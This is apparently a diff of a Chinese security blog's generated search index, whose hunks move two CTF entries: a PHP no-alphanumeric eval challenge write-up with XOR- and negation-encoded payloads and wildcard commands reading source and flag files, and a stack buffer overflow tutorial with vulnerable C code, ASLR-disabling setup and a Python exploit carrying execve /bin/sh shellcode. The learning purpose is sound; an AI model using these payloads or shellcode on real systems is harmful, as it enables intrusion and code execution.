class="line"># virtual methods</span><br><span class="line"># 参数类型为Landroid&#x2F;view&#x2F;View，返回类型为V</span><br><span class="line">.method public onClick(Landroid&#x2F;view&#x2F;View;)V</span><br><span class="line">    # 表示有三个寄存器</span><br><span class="line">    .registers 3</span><br><span class="line">    # 参数View类型的view变量对应的是寄存器p1</span><br><span class="line">    .param p1, &quot;view&quot;    # Landroid&#x2F;view&#x2F;View;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 24</span><br><span class="line">    #将&quot;Hello World!&quot;字符串放到寄存器v0中</span><br><span class="line">    const-string v0, &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">    .line 25</span><br><span class="line">    # 定义一个Ljava&#x2F;lang&#x2F;String类型的str变量对应本地寄存器v0</span><br><span class="line">    .local v0, &quot;str&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    # 调用该类的print方法，该方法的参数类型为Ljava&#x2F;lang&#x2F;String，返回值为V</span><br><span class="line">    # 调用print方法传入的参数为&#123;p0, v0&#125;，及print(p0, v0)，p0为this，v0为&quot;Hello World!&quot;字符串</span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;annotationtest&#x2F;MainActivity;-&gt;print(Ljava&#x2F;lang&#x2F;String;)V</span><br><span class="line"></span><br><span class="line">    .line 26</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></p>
+<p>参考文章：<br><a href="https://blog.csdn.net/hp910315/article/details/51823236">静态分析Android程序——smali文件解析</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>汇编指令</title>
     <url>/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h2><p>db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1<br>dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2<br>dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4<br>dup操作符用来进行数据的重复：<br>db 重复的次数 dup (重复的字节型数据)。<br>dw 重复的次数 dup (重复的字型数据)。<br>dd 重复的次数 dup (重复的双字数据)。<br><a id="more"></a></p>
@@ -609,42 +609,33 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF一道web题小结-无数字字母getFlag()</title>
-    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
+    <title>PWN学习笔记2--堆栈的缓冲区溢出</title>
+    <url>/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出有两种类型：</p>
 <ol>
-<li>长度不能大于35</li>
-<li>不能存在数字字母_和$符号</li>
+<li>基于栈的缓冲区溢出</li>
+<li>基于堆的缓冲区溢出</li>
 </ol>
-<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
-<ol>
-<li>利用位运算</li>
-<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
-分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
-还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
-直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
-当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
-使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
-</ol>
-<p>获取phpinfo信息失败。</p>
-<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
-<p>获取phpinfo信息成功。</p>
-<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
+<p>缓冲区溢出可导致任意代码执行！<br>任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……<br><a id="more"></a></p>
+<h1 id="栈溢出示例"><a href="#栈溢出示例" class="headerlink" title="栈溢出示例"></a>栈溢出示例</h1><h2 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">&quot;Input:%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>gcc编译<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭ASLR（地址空间布局随机化）</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln     </span><br></pre></td></tr></table></figure></p>
+<p>从上述代码可以看出，第[2]行代码存在缓冲区溢出，可导致任意代码执行。</p>
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用gdb编译<br><img src="/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/反编译.PNG" alt></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>当输入大小超过256时会溢出缓冲区并覆盖栈中的返回地址。通过输入“A” <em> 268 + “B” </em> 4测试。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gdb -q vuln</span><br><span class="line">Reading symbols from &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln...done.</span><br><span class="line">(gdb) r &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Starting program: &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">(gdb) p&#x2F;x $eip</span><br><span class="line">$1 &#x3D; 0x42424242</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>输出显示寄存器eip被“BBBB”覆盖。</p>
 <ul>
-<li>*可以代替0个及以上任意字符</li>
-<li>?可以代表1个任意字符</li>
+<li>0x8 is alignment space</li>
+<li>0x4 is caller’s EBP<br>268=256+8+4</li>
 </ul>
-<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
-<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
-<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">num</span>):</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>,num</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP&#x27;s + Shellcode</span></span><br><span class="line">buf = <span class="string">&quot;A&quot;</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Calling vulnerable program&quot;</span></span><br><span class="line">call([<span class="string">&quot;./vuln&quot;</span>, buf])</span><br></pre></td></tr></table></figure>
+<h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/">Classic Stack Based Buffer Overflow</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -681,33 +672,42 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN学习笔记2--堆栈的缓冲区溢出</title>
-    <url>/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
-    <content><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出有两种类型：</p>
+    <title>CTF一道web题小结-无数字字母getFlag()</title>
+    <url>/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><a id="more"></a><br>分析代码，了解到我们需要满足两个条件：</p>
 <ol>
-<li>基于栈的缓冲区溢出</li>
-<li>基于堆的缓冲区溢出</li>
+<li>长度不能大于35</li>
+<li>不能存在数字字母_和$符号</li>
 </ol>
-<p>缓冲区溢出可导致任意代码执行！<br>任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……<br><a id="more"></a></p>
-<h1 id="栈溢出示例"><a href="#栈溢出示例" class="headerlink" title="栈溢出示例"></a>栈溢出示例</h1><h2 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">&quot;Input:%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>gcc编译<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭ASLR（地址空间布局随机化）</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln     </span><br></pre></td></tr></table></figure></p>
-<p>从上述代码可以看出，第[2]行代码存在缓冲区溢出，可导致任意代码执行。</p>
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用gdb编译<br><img src="/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/反编译.PNG" alt></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>当输入大小超过256时会溢出缓冲区并覆盖栈中的返回地址。通过输入“A” <em> 268 + “B” </em> 4测试。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gdb -q vuln</span><br><span class="line">Reading symbols from &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln...done.</span><br><span class="line">(gdb) r &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Starting program: &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">(gdb) p&#x2F;x $eip</span><br><span class="line">$1 &#x3D; 0x42424242</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
-<p>输出显示寄存器eip被“BBBB”覆盖。</p>
+<h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p>
+<ol>
+<li>利用位运算</li>
+<li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
+分析：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c &#x3D; g</span><br><span class="line">&#123; ^ %1e &#x3D; e</span><br><span class="line">&#123; ^ %0f &#x3D; t</span><br><span class="line">&#123; ^ %3d &#x3D; F</span><br><span class="line">&#123; ^ %17 &#x3D; l</span><br><span class="line">&#123; ^ %1a &#x3D; a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; &#x3D; getFlag</span><br><span class="line">$_&#x3D;getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure>
+还有个payload为<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure>
+直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$啊&#x3D;~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure>
+当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+使用php5进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php5测试phpinfo.PNG" alt></li>
+</ol>
+<p>获取phpinfo信息失败。</p>
+<p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/php7测试phpinfo.PNG" alt></p>
+<p>获取phpinfo信息成功。</p>
+<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p>
 <ul>
-<li>0x8 is alignment space</li>
-<li>0x4 is caller’s EBP<br>268=256+8+4</li>
+<li>*可以代替0个及以上任意字符</li>
+<li>?可以代表1个任意字符</li>
 </ul>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">num</span>):</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>,num</span><br><span 